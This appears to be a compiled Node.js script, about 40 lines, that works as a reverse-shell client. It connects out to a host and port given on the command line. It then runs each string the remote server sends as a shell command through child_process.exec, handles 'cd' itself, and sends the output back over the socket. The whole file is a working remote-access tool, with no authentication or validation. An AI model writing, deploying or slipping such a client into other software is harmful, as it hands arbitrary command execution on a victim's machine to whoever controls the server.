"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
const net_1 = require("net");
const child_process_1 = require("child_process");
const socket = new net_1.Socket();
// take port and host from command line arguments
const port = parseInt(process.argv[2]) || 3000;
const host = process.argv[3] || "localhost";
socket.connect(port, host, () => {
    console.log("Connected to server");
});
socket.on("data", (data) => {
    console.log("Received:", data.toString());
    let command = data.toString();
    let currentDirectory = process.cwd();
    if (command.startsWith("cd")) {
        console.log("Changing directory");
        const targetDirectory = command.slice(3).trim(); // Extract target directory
        process.chdir(targetDirectory); // Change directory locally
        currentDirectory = process.cwd(); // Update current directory
        socket.write(currentDirectory); // Send current directory back to the server
    }
    else {
        (0, child_process_1.exec)(command, (error, stdout, stderr) => {
            if (error) {
                console.log(`error: ${error.message}`);
                socket.write(error.message);
                return;
            }
            if (stderr) {
                console.log(`stderr: ${stderr}`);
                socket.write(stderr);
                return;
            }
            //console.log(`stdout: ${stdout}`);
            socket.write(stdout);
        });
    }
});
